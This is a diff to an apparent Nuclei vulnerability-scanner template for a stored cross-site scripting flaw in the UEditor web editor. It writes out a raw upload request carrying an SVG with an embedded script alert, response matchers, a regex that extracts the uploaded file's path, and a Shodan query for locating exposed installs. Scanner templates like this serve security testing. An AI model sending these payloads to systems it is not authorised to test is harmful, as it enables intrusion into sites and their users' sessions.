@@ -1,13 +1,21 @@
 id: ueditor-xss
 
 info:
-  name: ueditor Cross Site Scripting
+  name: ueditor - Cross Site Scripting
   author: pwnhxl
-  severity: medium
-  description: UEditor contains an Cross Site Scripting vulnerability.
+  severity: high
+  description: |
+    UEditor rich text web editor latest vulnerability version XML file upload leads to stored XSS
   reference:
     - https://blog.csdn.net/weixin_50464560/article/details/124803185
     - https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    verified: "true"
+    shodan-query: title:"ueditor"
   tags: ueditor,xss
 
 variables:
@@ -16,9 +24,8 @@ variables:
 requests:
   - raw:
       - |
-        POST {{path}} HTTP/1.1
+        POST /ueditor/php/controller.php?action=uploadfile HTTP/1.1
         Host: {{Hostname}}
-        Origin: http://{{Hostname}}
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstring}}
 
         ------WebKitFormBoundary{{randstring}}
@@ -30,18 +37,10 @@ requests:
         <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
            <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
            <script type="text/javascript">
-              alert({{randstring}});
+              alert(document.domain);
            </script>
         </svg>
         ------WebKitFormBoundary{{randstring}}--
-
-    payloads:
-      path:
-        - "/ueditor/jsp/controller.jsp?action=uploadfile"
-        - "/ueditor/php/controller.php?action=uploadfile"
-        - "/ueditor/net/controller.ashx?action=uploadfile"
-        - "/ueditor/asp/controller.asp?action=uploadfilep"
-    attack: batteringram
 
     stop-at-first-match: true
     matchers-condition: and
@@ -49,13 +48,23 @@ requests:
       - type: word
         part: body
         words:
-          - 'state'
-          - 'SUCCESS'
-          - 'original'
-          - '.xml'
-          - '399'
+          - 'state":"SUCCESS'
+          - '.xml","title'
         condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
 
       - type: status
         status:
           - 200
+
+    extractors:
+      - type: regex
+        name: file_path
+        part: body
+        group: 1
+        regex:
+          - 'url":"(.*)","title'
